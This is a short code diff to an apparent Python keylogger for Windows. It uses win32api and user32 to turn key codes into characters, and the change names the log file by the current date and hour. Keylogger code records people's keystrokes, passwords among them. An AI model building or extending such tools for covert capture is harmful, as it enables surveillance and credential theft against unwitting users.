@@ -3,6 +3,7 @@ import ctypes
 import win32api
 import win32gui
 import win32process
+import datetime
 
 user32 = ctypes.WinDLL('user32', use_last_error=True)
 BUF_SIZE = 8
@@ -48,8 +49,10 @@ def get_char_from_key(vk_code, scan_code, layout):
     else:
         return None
 
+
 class KeyLogger:
-    def __init__(self, file_name='keys.txt'):
+    now = datetime.datetime.now().strftime("%d-%m-%y_%H")
+    def __init__(self, file_name=f"{now}.txt"):
         self.file_name = file_name
 
     def get_readable_special_key(self, key):
